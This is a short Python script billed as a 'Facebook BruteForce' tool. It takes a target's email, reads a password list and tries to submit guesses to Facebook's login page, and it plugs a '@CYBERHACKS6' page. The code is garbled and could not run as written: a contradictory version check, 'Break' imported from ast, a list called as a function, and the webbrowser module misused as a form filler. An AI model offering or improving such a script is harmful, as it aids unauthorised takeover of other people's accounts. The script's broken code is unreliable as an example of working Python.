import sys
import requests
from ast import Break, Try
import webbrowser
import time

if sys.version_info[0] !=2: 
	print('''--------------------------------------
	REQUIRED PYTHON 3
	use: python3 fb.py
--------------------------------------
			''')
	Break
print('\n-------- follow on FB @CYBERHACKS6--------\n')

post_url='https://www.facebook.com/login.php'
headers = {
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}


print('\n---------- Welcome To Facebook BruteForce ----------\n')
file=open('passwords.txt','r')

email = input("input Email of target:")
print ("\nTarget Email ID : ",email+"")
content = file.readlines()
passboy = content("\n")
print("[*]Fixating pass%s"%content)

response = webbrowser.open(post_url)
    
if responses: code = 200
webbrowser.select_form(nr=0)
webbrowser.select['email']=email
webbrowser.select['password']= passboy
requests=webbrowser.submit()
responses_data=response.read()
'find friends' in responses_data or 'two factor authentication' in responses_data or 'security code' in  responses_data;
print("[*]Found:%s"%content)

sys.exit